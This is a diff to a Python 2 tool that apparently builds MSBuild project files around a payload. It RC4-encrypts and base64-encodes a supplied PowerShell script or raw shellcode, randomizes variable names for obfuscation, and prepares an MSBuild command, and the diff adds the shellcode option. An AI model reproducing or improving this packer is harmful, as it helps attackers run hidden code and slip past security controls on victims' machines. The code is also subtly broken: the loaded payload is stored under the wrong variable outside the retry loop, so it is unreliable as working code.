@@ -7,18 +7,17 @@ import sys
 import re
 import os
 
-TEMPLATE = "include/template.csproj"
+TEMPLATE = "include/template-"
 IS_CMD_ARGS = False
 USE_KNOWN_PROCESS_NAME = False
 
 class Generator:
 
-	def __init__(self, path):
+	def __init__(self):
 		self.error = 0
 		self.banner()
-		self.data = self.load_file(path, True)
-		self.rand_vars()
-		self.chunk_size = 1024		
+		self.chunk_size = 1024	
+		
 	def clearscreen(self):
 		os.system("clear")	
 
@@ -43,6 +42,10 @@ class Generator:
 		print "        |`._`n'_.'|"
 		print "        `----^----\"\n\n"
 			
+	def set_template(self, path):
+		self.data = self.load_file(path, True)
+		self.rand_vars()
+		
 	def gen_str(self, size):
 		return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
 
@@ -51,7 +54,7 @@ class Generator:
 		return name[random.randrange(0, len(name) - 1)]
 		
 	def rand_vars(self):
-		for i in reversed(range(1, 31)):
+		for i in reversed(range(1, 50)):
 			self.data = self.data.replace("VAR" + str(i), self.gen_str(random.randrange(5, 25)))
 			
 	def get_output(self):
@@ -88,7 +91,6 @@ class Generator:
 		self.error = 0
 		return current
 		
-
 	def gen_final_cmd(self, path):
 		payload = "cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && "
 		size = 0
@@ -144,24 +146,31 @@ class RC4:
 		return output	
 		
 if __name__ == "__main__":
+	gen = Generator()
+	input_name = "PowerShell script"
 	
-	if len(sys.argv) >= 3:
+	if len(sys.argv) >= 4:
 		IS_CMD_ARGS = True
 		if "-knownprocess" in sys.argv:
 			USE_KNOWN_PROCESS_NAME = True
 	try:
-		gen = Generator(TEMPLATE)
+		if gen.capture_input("Set payload type 'powershell, shellcode'", 3) == "shellcode".lower():
+			input_name = "raw shellcode file"
+			TEMPLATE = TEMPLATE + "shellcode.csproj"
+		else:
+			TEMPLATE = TEMPLATE + "powershell.csproj"
+			
 		rc4 = RC4()
 		key = gen.gen_rc4_key(32)
-
-		powershell = gen.capture_input("Path to the PowerShell script", 1)
-		powershell = gen.load_file(powershell, False)	
+		
+		data_path = gen.capture_input("Path to the %s" % input_name, 1)
+		data_path = gen.load_file(data_path, False)	
 		while gen.get_error():
-			powershell = gen.capture_input("Path to the PowerShell script")
-			powershell = gen.load_file(powershell, False)
+			data_path = gen.capture_input("Path to the %s" % input_name)
+			data = gen.load_file(data_path, False)
 		
 		outfile = gen.capture_input("Path for the generated MsBuild out file", 2)
-		cipher = base64.b64encode(rc4.Encrypt(powershell, key))
+		cipher = base64.b64encode(rc4.Encrypt(data, key))
 		output = gen.get_output()
 		output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
 		try:
